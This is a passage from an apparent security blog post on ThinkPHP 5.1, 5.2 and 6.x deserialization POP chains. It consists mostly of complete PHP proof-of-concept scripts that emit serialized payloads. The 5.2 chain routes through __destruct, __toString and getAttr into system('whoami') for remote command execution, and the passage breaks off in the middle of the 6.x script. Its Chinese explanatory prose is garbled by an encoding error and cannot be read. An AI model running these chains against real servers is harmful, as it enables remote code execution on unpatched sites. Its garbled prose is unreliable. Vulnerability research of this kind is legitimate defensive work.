</span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;mergeParam) &#123;</span><br><span class="line">                    $method = <span class="keyword">$this</span>-&gt;method(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">switch</span> ($method) &#123;</span><br><span class="line">                        <span class="keyword">case</span> <span class="string">'POST'</span>:</span><br><span class="line">                            $vars = <span class="keyword">$this</span>-&gt;post(<span class="keyword">false</span>);</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="string">'PUT'</span>:</span><br><span class="line">                        <span class="keyword">case</span> <span class="string">'DELETE'</span>:</span><br><span class="line">                        <span class="keyword">case</span> <span class="string">'PATCH'</span>:</span><br><span class="line">                            $vars = <span class="keyword">$this</span>-&gt;put(<span class="keyword">false</span>);</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">default</span>:</span><br><span class="line">                            $vars = [];</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">$this</span>-&gt;param = array_merge(<span class="keyword">$this</span>-&gt;param, <span class="keyword">$this</span>-&gt;get(<span class="keyword">false</span>), $vars, <span class="keyword">$this</span>-&gt;route(<span class="keyword">false</span>));</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">$this</span>-&gt;mergeParam = <span class="keyword">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">true</span> === $name) &#123;</span><br><span class="line">                    <span class="comment">// è·å–åŒ…å«æ–‡ä»¶ä¸Šä¼ ä¿¡æ¯çš„æ•°ç»„</span></span><br><span class="line">                    $file = <span class="keyword">$this</span>-&gt;file();</span><br><span class="line">                    $data = is_array($file) ? array_merge(<span class="keyword">$this</span>-&gt;param, $file) : <span class="keyword">$this</span>-&gt;param;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input($data, <span class="string">''</span>, $default, $filter);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input(<span class="keyword">$this</span>-&gt;param, $name, $default, $filter);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isAjax</span><span class="params">($ajax = false)</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                $value  = <span class="keyword">$this</span>-&gt;server(<span class="string">'HTTP_X_REQUESTED_WITH'</span>);</span><br><span class="line">                $result = <span class="string">'xmlhttprequest'</span> == strtolower($value) ? <span class="keyword">true</span> : <span class="keyword">false</span>;</span><br><span class="line">        </span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">true</span> === $ajax) &#123;</span><br><span class="line">                    <span class="keyword">return</span> $result;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                $result           = <span class="keyword">$this</span>-&gt;param(<span class="keyword">$this</span>-&gt;config[<span class="string">'var_ajax'</span>]) ? <span class="keyword">true</span> : $result;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;mergeParam = <span class="keyword">false</span>;</span><br><span class="line">                <span class="keyword">return</span> $result;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">server</span><span class="params">($name = <span class="string">''</span>, $default = null)</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">empty</span>($name)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;server;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    $name = strtoupper($name);</span><br><span class="line">                &#125;</span><br><span class="line">        </span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;server[$name]) ? <span class="keyword">$this</span>-&gt;server[$name] : $default;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setHook</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;hook[<span class="string">'visible'</span>] = $value;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">        </span>&#123;</span><br><span class="line">            <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">            <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">RelationShip</span>;</span><br><span class="line">            <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span> &#123;</span><br><span class="line">        <span class="title">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">namespace</span> &#123;</span><br><span class="line">        $<span class="title">request</span> = <span class="title">new</span> <span class="title">think</span>\<span class="title">Request</span>;</span><br><span class="line">        $request-&gt;setHook(<span class="keyword">array</span>($request, <span class="string">'isAjax'</span>));</span><br><span class="line">        $conversion = <span class="keyword">new</span> think\model\Pivot();</span><br><span class="line">        $conversion-&gt;setData(<span class="string">'key'</span>, $request);</span><br><span class="line">        $windows = <span class="keyword">new</span> think\process\pipes\Windows();</span><br><span class="line">        $windows-&gt;setFile($conversion);</span><br><span class="line">        <span class="keyword">echo</span> urlencode(serialize($windows));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="ThinkPHP5-2-X"><a href="#ThinkPHP5-2-X" class="headerlink" title="ThinkPHP5.2.X"></a>ThinkPHP5.2.X</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">composer create-project topthink&#x2F;think&#x3D;5.2.x-dev tp52x</span><br><span class="line">cd tp52x</span><br><span class="line">.&#x2F;think run</span><br></pre></td></tr></table></figure>

<p><img src="./1571192945070.png" alt="Alt text"></p>
<p><img src="./1571192967882.png" alt="Alt text"></p>
<p><img src="./1571193283633.png" alt="Alt text"></p>
<p>åœ¨å¤ç°åœ¨æ—¶å€™çœ‹åˆ°æ–‡ç« åˆ†æè¯´tp5.2.xé‡Œé¢çš„<code>$relation-&gt;visible($name);</code>è¢«åˆ é™¤æ‰äº†ï¼Œæ‰€ä»¥æ²¡æ³•ç”¨tp5.1.xçš„é“¾ã€‚ä¸ªäººæ„Ÿè§‰å…¶å®è¯´çš„ä¸å¯¹ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå®ƒè¿˜åœ¨åªæ˜¯è¢«å°è£…åˆ°äº†å¦å¤–ä¸€ä¸ªå‡½æ•°é‡Œé¢ï¼Œå˜é‡ä¾ç„¶å¯æ§ï¼Œ<strong>çœŸæ­£çš„åŸå› åº”è¯¥æ˜¯ Request ç±»çš„ __call æ–¹æ³•è¢«è¢«ç§»é™¤äº†</strong>ã€‚<br><img src="./1571204818047.png" alt="Alt text"></p>
<p>è‡³æ­¤ï¼Œtp5.1å’Œtp5.2ä»è¿™é‡Œå¼€å§‹åˆ†å‰ï¼Œtp5.2.xå°±ä¸‹æ¥ç”¨çš„gadgetæ˜¯toArrayä¸­çš„getAttr<br><img src="./1571205423110.png" alt="Alt text"></p>
<p><img src="./1571205777062.png" alt="Alt text"></p>
<p><img src="./1571205916533.png" alt="Alt text"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span> &#123;</span><br><span class="line">        <span class="title">class</span> <span class="title">Windows</span> &#123;</span><br><span class="line">            <span class="title">private</span> $<span class="title">files</span> = [];</span><br><span class="line">            <span class="keyword">private</span> $fileHandles = [];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;close();</span><br><span class="line">                <span class="keyword">$this</span>-&gt;removeFiles();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span><span class="params">()</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;fileHandles <span class="keyword">as</span> $handle) &#123;</span><br><span class="line">                    fclose($handle);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;fileHandles = [];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">removeFiles</span><span class="params">()</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $filename) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (file_exists($filename)) &#123;</span><br><span class="line">                        @unlink($filename);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;files = [];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setFile</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;files[] = $value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span> &#123;</span><br><span class="line">        <span class="title">trait</span> <span class="title">Conversion</span>&#123;</span><br><span class="line">            protected $visable = ['key' =&gt; 'value'];</span><br><span class="line">                  </span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span><span class="params">()</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                $item       = [];</span><br><span class="line">                $hasVisible = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;visible <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (is_string($val)) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (strpos($val, <span class="string">'.'</span>)) &#123;</span><br><span class="line">                            <span class="keyword">list</span>($relation, $name)      = explode(<span class="string">'.'</span>, $val);</span><br><span class="line">                            <span class="keyword">$this</span>-&gt;visible[$relation][] = $name;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="keyword">$this</span>-&gt;visible[$val] = <span class="keyword">true</span>;</span><br><span class="line">                            $hasVisible          = <span class="keyword">true</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;visible[$key]);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;hidden <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (is_string($val)) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (strpos($val, <span class="string">'.'</span>)) &#123;</span><br><span class="line">                            <span class="keyword">list</span>($relation, $name)     = explode(<span class="string">'.'</span>, $val);</span><br><span class="line">                            <span class="keyword">$this</span>-&gt;hidden[$relation][] = $name;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="keyword">$this</span>-&gt;hidden[$val] = <span class="keyword">true</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;hidden[$key]);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// åˆå¹¶å…³è”æ•°æ®</span></span><br><span class="line">                $data = array_merge(<span class="keyword">$this</span>-&gt;data, <span class="keyword">$this</span>-&gt;relation);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">foreach</span> ($data <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">                    <span class="keyword">if</span> ($val <span class="keyword">instanceof</span> Model || $val <span class="keyword">instanceof</span> ModelCollection) &#123;</span><br><span class="line">                        <span class="comment">// å…³è”æ¨¡å‹å¯¹è±¡</span></span><br><span class="line">                        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;visible[$key])) &#123;</span><br><span class="line">                            $val-&gt;visible(<span class="keyword">$this</span>-&gt;visible[$key]);</span><br><span class="line">                        &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;hidden[$key])) &#123;</span><br><span class="line">                            $val-&gt;hidden(<span class="keyword">$this</span>-&gt;hidden[$key]);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// å…³è”æ¨¡å‹å¯¹è±¡</span></span><br><span class="line">                        $item[$key] = $val-&gt;toArray();</span><br><span class="line">                    &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;visible[$key])) &#123;</span><br><span class="line">                        $item[$key] = <span class="keyword">$this</span>-&gt;getAttr($key);</span><br><span class="line">                    &#125; <span class="keyword">elseif</span> (!<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;hidden[$key]) &amp;&amp; !$hasVisible) &#123;</span><br><span class="line">                        $item[$key] = <span class="keyword">$this</span>-&gt;getAttr($key);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> $item;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toJson</span><span class="params">($options = JSON_UNESCAPED_UNICODE)</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> json_encode(<span class="keyword">$this</span>-&gt;toArray(), $options);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;toJson();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">trait</span> Attribute&#123;</span><br><span class="line">            <span class="keyword">protected</span> $strict = <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">private</span> $data = [<span class="string">'key'</span> =&gt; <span class="string">'whoami'</span>];</span><br><span class="line">            <span class="keyword">private</span> $withAttr = [<span class="string">'key'</span> =&gt; <span class="string">'system'</span>];</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getValue</span><span class="params">(string $name, $value, bool $relation = false)</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="comment">// æ£€æµ‹å±æ€§è·å–å™¨</span></span><br><span class="line">                $fieldName = <span class="keyword">$this</span>-&gt;getRealFieldName($name);</span><br><span class="line">                <span class="comment">//$method    = 'get' . App::parseName($name, 1) . 'Attr';</span></span><br><span class="line">        </span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;withAttr[$fieldName])) &#123;</span><br><span class="line">                    <span class="keyword">if</span> ($relation) &#123;</span><br><span class="line">                        $value = <span class="keyword">$this</span>-&gt;getRelationValue($name);</span><br><span class="line">                    &#125;</span><br><span class="line">        </span><br><span class="line">                    $closure = <span class="keyword">$this</span>-&gt;withAttr[$fieldName];</span><br><span class="line">                    $value   = $closure($value, <span class="keyword">$this</span>-&gt;data);</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (method_exists(<span class="keyword">$this</span>, $method)) &#123;</span><br><span class="line">                    <span class="keyword">if</span> ($relation) &#123;</span><br><span class="line">                        $value = <span class="keyword">$this</span>-&gt;getRelationValue($name);</span><br><span class="line">                    &#125;</span><br><span class="line">        </span><br><span class="line">                    $value = <span class="keyword">$this</span>-&gt;$method($value, <span class="keyword">$this</span>-&gt;data);</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;type[$fieldName])) &#123;</span><br><span class="line">                    <span class="comment">// ç±»å‹è½¬æ¢</span></span><br><span class="line">                    $value = <span class="keyword">$this</span>-&gt;readTransform($value, <span class="keyword">$this</span>-&gt;type[$fieldName]);</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (<span class="keyword">$this</span>-&gt;autoWriteTimestamp &amp;&amp; in_array($fieldName, [<span class="keyword">$this</span>-&gt;createTime, <span class="keyword">$this</span>-&gt;updateTime])) &#123;</span><br><span class="line">                    $value = <span class="keyword">$this</span>-&gt;getTimestampValue($value);</span><br><span class="line">                &#125; <span class="keyword">elseif</span> ($relation) &#123;</span><br><span class="line">                    $value = <span class="keyword">$this</span>-&gt;getRelationAttribute($name);</span><br><span class="line">                &#125;</span><br><span class="line">        </span><br><span class="line">                <span class="keyword">return</span> $value;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttr</span><span class="params">(string $name)</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    $relation = <span class="keyword">false</span>;</span><br><span class="line">                    $value    = <span class="keyword">$this</span>-&gt;getData($name);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InvalidArgumentException $e) &#123;</span><br><span class="line">                    $relation = <span class="keyword">true</span>;</span><br><span class="line">                    $value    = <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        </span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;getValue($name, $value, $relation);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span><span class="params">(string $name = null)</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (is_null($name)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">                &#125;</span><br><span class="line">        </span><br><span class="line">                $fieldName = <span class="keyword">$this</span>-&gt;getRealFieldName($name);</span><br><span class="line">        </span><br><span class="line">                <span class="keyword">if</span> (array_key_exists($fieldName, <span class="keyword">$this</span>-&gt;data)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$fieldName];</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (array_key_exists($name, <span class="keyword">$this</span>-&gt;relation)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation[$name];</span><br><span class="line">                &#125;</span><br><span class="line">        </span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> InvalidArgumentException(<span class="string">'property not exists:'</span> . <span class="keyword">static</span>::class . <span class="string">'-&gt;'</span> . $name);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getRealFieldName</span><span class="params">(string $name)</span>: <span class="title">string</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;strict ? $name : App::parseName($name);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">trait</span> RelationShip</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">private</span> $relation = [];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">namespace</span> <span class="title">think</span> &#123;</span><br><span class="line">        <span class="title">abstract</span> <span class="title">class</span> <span class="title">Model</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">            <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line">            <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">RelationShip</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span> &#123;</span><br><span class="line">        <span class="title">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">namespace</span> &#123;</span><br><span class="line">        $<span class="title">conversion</span> = <span class="title">new</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>();</span><br><span class="line">        <span class="comment">//$conversion-&gt;__toString();</span></span><br><span class="line">        $windows = <span class="keyword">new</span> think\process\pipes\Windows();</span><br><span class="line">        $windows-&gt;setFile($conversion);</span><br><span class="line">        <span class="keyword">echo</span> urlencode(serialize($windows));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="ThinkPHP6-X"><a href="#ThinkPHP6-X" class="headerlink" title="ThinkPHP6.X"></a>ThinkPHP6.X</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink/think=6.0.x-dev tp6x</span><br><span class="line"><span class="built_in">cd</span> tp6x</span><br><span class="line">./think run</span><br></pre></td></tr></table></figure>

<p>ThinkPHP6.x çš„ä»£ç ç§»é™¤äº† think\process\pipes\Windows ç±»ï¼Œä½†POPé“¾__toString ä¹‹åçš„ Gadget ä»ç„¶å­˜åœ¨ï¼Œæ‰€ä»¥å†æ‰¾ä¸€ä¸ªå¯è§¦å‘__toStringçš„ç‚¹å³å¯ã€‚</p>
<p>vendor/topthink/think-orm/src/Model.php<br><img src="./1571212486705.png" alt="Alt text"></p>
<p><img src="./1571212527060.png" alt="Alt text"></p>
<p><img src="./1571212461170.png" alt="Alt text"></p>
<p><img src="./1571212571282.png" alt="Alt text"></p>
<p><img src="./1571212618925.png" alt="Alt text"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">namespace</span> <span class="title">think</span>&#123;</span><br><span class="line">        <span class="title">abstract</span> <span class="title">class</span> <span class="title">Model</span>&#123;</span><br><span class="line">            <span class="title">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">ModelEvent</span>;</span><br><span class="line">            <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">            <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">TimeStamp</span>;</span><br><span class="line">            <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">RelationShip</span>;</span><br><span class="line">            <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">private</span> $lazySave = <span class="keyword">True</span>;</span><br><span class="line">            <span class="keyword">private</span> $exists = <span class="keyword">True</span>;</span><br><span class="line">            <span class="keyword">private</span> $force = <span class="keyword">True</span>;</span><br><span class="line">            <span class="keyword">protected</span> $table = <span class="string">''</span>;</span><br><span class="line">            <span class="keyword">protected</span> $suffix = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;lazySave) &#123;</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;save();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">(array $data = [], string $sequence = null)</span>: <span class="title">bool</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;isEmpty() || <span class="keyword">false</span> === <span class="keyword">$this</span>-&gt;trigger(<span class="string">'BeforeWrite'</span>)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                $result = <span class="keyword">$this</span>-&gt;exists ? <span class="keyword">$this</span>-&gt;updateData() : <span class="keyword">$this</span>-&gt;insertData($sequence);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isEmpty</span><span class="params">()</span>: <span class="title">bool</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">updateData</span><span class="params">()</span>: <span class="title">bool</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="comment">// äº‹ä»¶å›è°ƒ</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">false</span> === <span class="keyword">$this</span>-&gt;trigger(<span class="string">'BeforeUpdate'</span>)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        </span><br><span class="line">                <span class="comment">//$this-&gt;checkData();</span></span><br><span class="line">        </span><br><span class="line">                <span class="comment">// è·å–æœ‰æ›´æ–°çš„æ•°æ®</span></span><br><span class="line">                $data = <span class="keyword">$this</span>-&gt;getChangedData();</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">empty</span>($data)) &#123;</span><br><span class="line">                    <span class="comment">// å…³è”æ›´æ–°</span></span><br><span class="line">                    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;relationWrite)) &#123;</span><br><span class="line">                        <span class="keyword">$this</span>-&gt;autoRelationUpdate();</span><br><span class="line">                    &#125;</span><br><span class="line">        </span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        </span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;autoWriteTimestamp &amp;&amp; <span class="keyword">$this</span>-&gt;updateTime &amp;&amp; !<span class="keyword">isset</span>($data[<span class="keyword">$this</span>-&gt;updateTime])) &#123;</span><br><span class="line">                    <span class="comment">// è‡ªåŠ¨å†™å…¥æ›´æ–°æ—¶é—´</span></span><br><span class="line">                    $data[<span class="keyword">$this</span>-&gt;updateTime]       = <span class="keyword">$this</span>-&gt;autoWriteTimestamp(<span class="keyword">$this</span>-&gt;updateTime);</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;data[<span class="keyword">$this</span>-&gt;updateTime] = $data[<span class="keyword">$this</span>-&gt;updateTime];</span><br><span class="line">                &#125;</span><br><span class="line">        </span><br><span class="line">                <span class="comment">// æ£€æŸ¥å…è®¸å­—æ®µ</span></span><br><span class="line">                $allowFields = <span class="keyword">$this</span>-&gt;checkAllowFields();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">checkAllowFields</span><span class="params">()</span>: <span class="title">array</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;field)) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;schema)) &#123;</span><br><span class="line">                        <span class="keyword">$this</span>-&gt;field = array_keys(array_merge(<span class="keyword">$this</span>-&gt;schema, <span class="keyword">$this</span>-&gt;jsonType));</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="comment">//$query = $this-&gt;db();</span></span><br><span class="line">                        $table = <span class="keyword">$this</span>-&gt;table ? <span class="keyword">$this</span>-&gt;table . <span class="keyword">$this</span>-&gt;suffix : $query-&gt;getTable();</span><br><span class="line">                        <span class="keyword">$this</span>-&gt;field = $query-&gt;getConnection()-&gt;getTableFields($table);</span><br><span class="line">                    